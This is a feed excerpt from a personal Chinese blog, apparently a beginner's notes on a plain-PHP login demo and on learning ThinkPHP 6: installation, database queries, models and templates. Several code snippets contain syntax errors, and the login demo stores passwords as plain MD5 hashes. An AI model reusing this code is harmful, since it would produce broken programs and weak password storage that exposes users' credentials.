class="number">80</span>));</span><br></pre></td></tr></table></figure></li></ul><p>密码md5加密后储存在数据库中，头像base64加密后保存在数据库中，显示的时候用data协议读出来显示。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;5月份的时候，郁师傅让我不用框架写个简单的登陆注册上传头像留言板的功能，要熟悉开发。还是贴出来记录一下吧。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;login.html&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;meta&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;http-equiv&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;Content-type&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;content&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;text/html;charset=utf-8&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;center&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;form&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;action&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;login.php&quot;&lt;/span&gt;&lt;span class=&quot;attr&quot;&gt;method&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;post&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;label&lt;/span&gt;&amp;gt;&lt;/span&gt;username&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;username&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;label&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;label&lt;/span&gt;&amp;gt;&lt;/span&gt;password&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;password&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;label&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;button&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;login&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;login&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;button&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;button&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;register&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;register&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;button&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;form&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;center&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="杂项" scheme="http://chenxiyuan.vip/categories/%E6%9D%82%E9%A1%B9/"/>
    
    
      <category term="php" scheme="http://chenxiyuan.vip/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>thinkphp框架学习</title>
    <link href="http://chenxiyuan.vip/2019/07/20/tp6-0%E5%AD%A6%E4%B9%A0/"/>
    <id>http://chenxiyuan.vip/2019/07/20/tp6-0学习/</id>
    <published>2019-07-20T03:22:53.000Z</published>
    <updated>2019-07-21T13:20:20.837Z</updated>
    
    <content type="html"><![CDATA[<h2 id="composer"><a href="#composer" class="headerlink" title="composer"></a>composer</h2><p>因为我用的是phpstudy，首先要切换到php7以上要安装vc14，结果安装失败，原因是因为我安装了VS2017，然后我就有了VC2017的版本，我在控制面板把64版本的VC2017卸载，然后重新安装vc14成功。phpstudy2016自带composer1.2版本，开启openssl扩展，执行composer self-update报错:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Updating to version 1.8.6 (stable channel).</span><br><span class="line">    Downloading: 100%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  [RuntimeException]</span><br><span class="line">  SHA384 is not supported by your openssl extension, could not verify the phar file integrity</span><br></pre></td></tr></table></figure></p><p>我就只好自己安装了<a href="https://getcomposer.org/download/" target="_blank" rel="noopener">地址</a>，安装里填的是7.2版本的php.exe，因为6.0版本的tp只支持7.1以上的php。</p><h2 id="安装框架"><a href="#安装框架" class="headerlink" title="安装框架"></a>安装框架</h2><p>切换到WWW目录，安装tp框架<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think tp6 6.0.*-dev</span><br></pre></td></tr></table></figure></p><p>测试执行，进入到tp6文件夹下，执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php think run</span><br></pre></td></tr></table></figure></p><p>访问127.0.0.1::8000，可以看到欢迎界面。<br><a id="more"></a></p><h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><ul><li>框架源码的位置:vendor</li><li>应用目录名称与命名空间一致了:app</li><li>其他目录结构与文件功能保持5.1版本一致</li></ul><h2 id="配置设置"><a href="#配置设置" class="headerlink" title="配置设置"></a>配置设置</h2><p>通过create-project默认安装的话， 会在根目录自带一个.example.env文件，直接更名为.env文件就可以了。填好数据库配置<br>，打开config下的database.php，添加:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">facade</span>\<span class="title">Env</span>;</span><br></pre></td></tr></table></figure></p><p>然后conroller下index做个测试<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">BaseController</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">facade</span>\<span class="title">Env</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">facade</span>\<span class="title">Db</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $query = <span class="string">'show database'</span>;</span><br><span class="line">        dump(Env::get(<span class="string">'database.hostname'</span>));</span><br><span class="line">        </span><br><span class="line">        dump(Db::query(<span class="string">"show databases"</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span><span class="params">($name = <span class="string">'ThinkPHP6'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'hello,'</span> . $name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到成功输出</p><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>查询构造器<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//table():设置数据表</span></span><br><span class="line"><span class="comment">//field():设置查询字段列表</span></span><br><span class="line"><span class="comment">//find():返回满足条件的第一条记录</span></span><br><span class="line"><span class="comment">//select():返回满足条件的多条记录</span></span><br><span class="line"><span class="comment">//where():设置查询条件，字符串，表达式，数组</span></span><br><span class="line"><span class="comment">//fetchSql():true,会拦截执行，返回构造好的sql语句</span></span><br><span class="line">$res=Db::table(<span class="string">'user'</span>)</span><br><span class="line">-&gt;field(<span class="string">'username,age'</span>)</span><br><span class="line">-&gt;where(<span class="string">'username=chenxiyuan'</span>)</span><br><span class="line">-&gt;select();</span><br><span class="line">dump($res)</span><br><span class="line"><span class="comment">//区间，模糊查询:-&gt;where('age','between',[10,20])</span></span><br><span class="line"><span class="comment">//关联数组,等值查询，AND:-&gt;where(['user_id'=&gt;2,'age'=&gt;18])</span></span><br><span class="line"><span class="comment">//order('age',' desc') asc升序，desc降序,多个字段升降序要放在一个数组中</span></span><br></pre></td></tr></table></figure></p><h2 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h2><p>创建一个模型类,User.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> $table =<span class="string">'user'</span>;</span><br><span class="line"><span class="keyword">protected</span> $pk =<span class="string">'user_id'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>创建一个控制器，ModelTest.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">namaspace app\index\controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">model</span>\<span class="title">User</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ModelTest</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//模型对象</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">demo1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//创建模型对象</span></span><br><span class="line">$user = <span class="keyword">new</span> user();</span><br><span class="line">$res=$user-&gt;db()-&gt;find(<span class="number">1</span>);</span><br><span class="line">dump($res);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//依赖注入</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">demo2</span><span class="params">(User $user)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$res=$user-&gt;db()-&gt;find(<span class="number">3</span>);</span><br><span class="line"><span class="keyword">echo</span> $res[<span class="string">'username'</span>];</span><br><span class="line"><span class="keyword">echo</span> $res-&gt;name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//create():参数就是要新增的数据，返回当前模型对象</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$data=[<span class="string">'username'</span>=&gt;<span class="string">'chenxiyuan'</span>,<span class="string">'password'</span>=<span class="string">'123456'</span>]</span><br><span class="line">$user = User::create($data);</span><br><span class="line"><span class="keyword">return</span> $user[<span class="string">'user_id'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//查询，直接用db()来调用Query类中的方法完成</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span><span class="params">(User $user)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$res=$user-&gt;db()-&gt;find(<span class="number">1</span>);</span><br><span class="line">dump($res);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//更新:update</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$user = User::update([<span class="string">'username'</span>=&gt;<span class="string">'chenxiyuan'</span>],[<span class="string">'password'</span>=&gt;<span class="string">'111111'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//删除:destroy(),返回布尔值</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$res = User::destroy(<span class="function"><span class="keyword">function</span> <span class="params">($query)</span></span>&#123;</span><br><span class="line">$query-&gt;where(<span class="string">'username'</span>=<span class="string">'chenxiyuan'</span>);</span><br><span class="line">&#125;);</span><br><span class="line">$res = User::destroy([<span class="string">'user_id'</span>=&gt;<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><h2 id="视图与模板"><a href="#视图与模板" class="headerlink" title="视图与模板"></a>视图与模板</h2><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>新建一个ViewTest控制器，目录为app/index/controller/ViewTest.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">View</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ViewTest</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">//方法与模板文件对应</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">(View $view)</span></span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="comment">//默认的视图目录是view</span></span><br><span class="line">        <span class="comment">//return $view-&gt;fetch('file:///D:/phpStudy/WWW/tp6/view/index/viewtest/index.html');</span></span><br><span class="line">        <span class="keyword">return</span> $view-&gt;fetch();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>模板路径在与app同级的view下，路径为view/index/viewtest/index.html。如果方法与模板文件名对应，那么fetc()可为空，如果不对应，则要自己填模板名(不用填.html)，当然填实际路径也可以。<br>创建完成后，访问127.0.0.1:8000/index/viewtest/index</p><h3 id="模板赋值"><a href="#模板赋值" class="headerlink" title="模板赋值"></a>模板赋值</h3><ul><li><p>添加fuzhi方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fuzhi</span><span class="params">(View $view)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $view-&gt;assign(<span class="string">'site'</span>,<span class="string">'晨曦远的个人博客'</span>);</span><br><span class="line">        <span class="comment">//一组变量</span></span><br><span class="line">        $view-&gt;assign([<span class="string">'username'</span>=&gt;<span class="string">'chenxiyuan'</span>,<span class="string">'email'</span>=&gt;<span class="string">'969987508@qq.com'</span>]);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//数组</span></span><br><span class="line">        $info = [<span class="string">'grade'</span>=&gt;<span class="string">'1'</span>,<span class="string">'age'</span>=&gt;<span class="number">19</span>,<span class="string">'sex'</span>=&gt;<span class="string">'boy'</span>];</span><br><span class="line">        $view-&gt;assign(<span class="string">'info'</span>,$info);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//对象</span></span><br><span class="line">        $obj = <span class="keyword">new</span> \stdClass();</span><br><span class="line">        $obj-&gt;course = <span class="string">'math'</span>;</span><br><span class="line">        $obj-&gt;score = <span class="number">60</span>;</span><br><span class="line">        $view-&gt;assign(<span class="string">'stu'</span>,$obj);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//预定义变量: $_GET, $_SERVER</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $view-&gt;fetch();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>fuzhi.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>模板赋值<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">&#123;// 注释&#125;</span><br><span class="line">&#123;// 花括号将变量包裹即可访问变量&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;$site&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>用户名:&#123;$username&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>邮箱:&#123;$email&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&#123;// 数组&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>grade:&#123;$info['grade']&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>age:&#123;$info['age']&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>sex:&#123;$info.sex&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&#123;// 对象&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>course:&#123;$stu-&gt;course&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>score:&#123;$stu-&gt;score&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&#123;// 预定义变量&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>id:&#123;$_GET['id']&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>id:&#123;$Think.get.id&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h3><ul><li><p>循环</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 